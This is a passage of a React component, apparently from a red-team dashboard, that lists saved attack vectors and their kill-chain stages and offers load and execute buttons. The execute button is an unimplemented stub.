            <BoltIcon className="w-5 h-5 text-cyber-purple" />
            ATTACK VECTORS
            {attackVectors.length > 0 && (
              <span className="ml-auto text-xs text-slate">
                {attackVectors.length} saved
              </span>
            )}
          </h2>

          <div className="space-y-3 max-h-[600px] overflow-y-auto">
            {attackVectors.length === 0 ? (
              <div className="text-center py-8 text-slate">
                <DocumentTextIcon className="w-12 h-12 mx-auto mb-2 opacity-50" />
                <p className="text-sm">No attack vectors saved yet</p>
                <p className="text-xs text-slate/60 mt-1">Build a kill chain and save it as an attack vector</p>
              </div>
            ) : (
              attackVectors.map((vector) => (
                <div
                  key={vector.id}
                  onClick={() => setCurrentAttackVector(currentAttackVector?.id === vector.id ? null : vector)}
                  className={`p-4 rounded-xl border cursor-pointer transition-all ${
                    currentAttackVector?.id === vector.id
                      ? 'border-cyber-purple bg-cyber-purple/10 shadow-[0_0_20px_rgba(168,85,247,0.15)]'
                      : 'border-slate/20 bg-graphite/50 hover:border-slate/40'
                  }`}
                >
                  <div className="flex items-center justify-between mb-2">
                    <div className="flex items-center gap-2">
                      <span className="font-display font-semibold text-white">{vector.name}</span>
                      <span className={`text-xs px-1.5 py-0.5 rounded ${
                        vector.status === 'completed' ? 'bg-neon-green/20 text-neon-green border border-neon-green/40' :
                        vector.status === 'running' ? 'bg-cyber-purple/20 text-cyber-purple border border-cyber-purple/40' :
                        vector.status === 'failed' ? 'bg-neon-red/20 text-neon-red border border-neon-red/40' :
                        'bg-slate/20 text-slate border border-slate/40'
                      }`}>
                        {vector.status.toUpperCase()}
                      </span>
                    </div>
                    <div className="flex items-center gap-2">
                      {vector.status === 'running' && (
                        <ArrowPathIcon className="w-4 h-4 text-cyber-purple animate-spin" />
                      )}
                      {vector.status === 'completed' && (
                        <CheckCircleIcon className="w-4 h-4 text-neon-green" />
                      )}
                      {vector.status === 'failed' && (
                        <ExclamationCircleIcon className="w-4 h-4 text-neon-red" />
                      )}
                      <button
                        onClick={(e) => {
                          e.stopPropagation()
                          if (confirm('Delete this attack vector?')) {
                            removeAttackVector(vector.id)
                            toast.success('Attack vector deleted')
                          }
                        }}
                        className="text-slate hover:text-neon-red transition-colors"
                        title="Delete"
                      >
                        <TrashIcon className="w-4 h-4" />
                      </button>
                    </div>
                  </div>
                  <div className="text-xs text-slate space-y-1">
                    <div className="flex items-center gap-4">
                      <span>{vector.killChain.enumeration.selectedHosts.length} host(s)</span>
                      <span>{vector.killChain.weaponization.selectedAttacks.length} attack(s)</span>
                      <span>{vector.killChain.postExploitation.selectedModules.length} post-ex module(s)</span>
                    </div>
                    <p className="text-slate/50">
                      {new Date(vector.timestamp).toLocaleString()}
                    </p>
                  </div>

                  {/* Expanded Details */}
                  {currentAttackVector?.id === vector.id && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      exit={{ opacity: 0, height: 0 }}
                      className="mt-4 pt-4 border-t border-slate/20 space-y-3"
                    >
                      {/* Enumeration */}
                      <div>
                        <p className="text-xs font-display tracking-wider text-cyber-cyan mb-2">ENUMERATION</p>
                        <div className="space-y-1">
                          {vector.killChain.enumeration.selectedHosts.map((host, idx) => (
                            <div key={idx} className="text-xs font-mono text-slate bg-graphite/50 p-2 rounded">
                              {host.ip} ({host.os_type}) - {host.ports.length} ports
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Weaponization */}
                      <div>
                        <p className="text-xs font-display tracking-wider text-cyber-purple mb-2">WEAPONIZATION</p>
                        <div className="space-y-1">
                          {vector.killChain.weaponization.selectedAttacks.map((attack, idx) => (
                            <div key={idx} className="text-xs font-mono text-slate bg-graphite/50 p-2 rounded">
                              {attack.name} :{attack.port}
                            </div>
                          ))}
                        </div>
                      </div>

                      {/* Post Exploitation */}
                      {vector.killChain.postExploitation.selectedModules.length > 0 && (
                        <div>
                          <p className="text-xs font-display tracking-wider text-neon-red mb-2">POST EXPLOITATION ({vector.killChain.postExploitation.osType})</p>
                          <div className="space-y-1">
                            {vector.killChain.postExploitation.selectedModules.map((mod, idx) => (
                              <div key={idx} className="text-xs font-mono text-slate bg-graphite/50 p-2 rounded">
                                {mod.name} - {mod.module}
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* Lateral Movement */}
                      {vector.killChain.lateralMovement.selectedModules.length > 0 && (
                        <div>
                          <p className="text-xs font-display tracking-wider text-neon-yellow mb-2">LATERAL MOVEMENT</p>
                          <div className="space-y-1">
                            {vector.killChain.lateralMovement.selectedModules.map((mod, idx) => (
                              <div key={idx} className="text-xs font-mono text-slate bg-graphite/50 p-2 rounded">
                                {mod.name} - {mod.target}
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* Endpoint Status */}
                      {vector.endpointStatus && Object.keys(vector.endpointStatus).length > 0 && (
                        <div>
                          <p className="text-xs font-display tracking-wider text-white mb-2">ENDPOINT STATUS</p>
                          <div className="space-y-1">
                            {Object.entries(vector.endpointStatus).map(([endpoint, status]) => (
                              <div key={endpoint} className="flex items-center justify-between text-xs bg-graphite/50 p-2 rounded">
                                <span className="font-mono text-slate">{endpoint}</span>
                                <div className="flex items-center gap-2">
                                  <span className="text-slate/50">{status.stage}</span>
                                  {status.status === 'running' && (
                                    <ArrowPathIcon className="w-3 h-3 text-cyber-purple animate-spin" />
                                  )}
                                  {status.status === 'success' && (
                                    <CheckCircleIcon className="w-3 h-3 text-neon-green" />
                                  )}
                                  {status.status === 'failed' && (
                                    <ExclamationCircleIcon className="w-3 h-3 text-neon-red" />
                                  )}
                                </div>
                              </div>
                            ))}
                          </div>
                        </div>
                      )}

                      {/* Actions */}
                      <div className="flex gap-2 pt-2">
                        <motion.button
                          onClick={(e) => {
                            e.stopPropagation()
                            setKillChain(vector.killChain)
                            setAttackTab('killchain')
                            toast.success('Attack vector loaded into kill chain')
                          }}
                          className="flex-1 px-3 py-2 rounded-lg bg-cyber-purple/20 border border-cyber-purple/30 text-cyber-purple text-xs font-display font-semibold tracking-wider hover:bg-cyber-purple/30 transition-colors"
                        >
                          LOAD INTO KILL CHAIN
                        </motion.button>
                        <motion.button
                          onClick={(e) => {
                            e.stopPropagation()
                            updateAttackVector(vector.id, { status: 'running' })
                            toast.success('Executing attack vector...')
                            // TODO: Implement execution
                          }}
                          disabled={vector.status === 'running'}
                          className="flex-1 px-3 py-2 rounded-lg bg-neon-green/20 border border-neon-green/30 text-neon-green text-xs font-display font-semibold tracking-wider hover:bg-neon-green/30 transition-colors disabled:opacity-50"
                        >
                          EXECUTE
                        </motion.button>
                      </div>
                    </motion.div>
                  )}
                </div>
              ))
            )}
          </div>
        </motion.div>
      </div>
    </div>
  )
}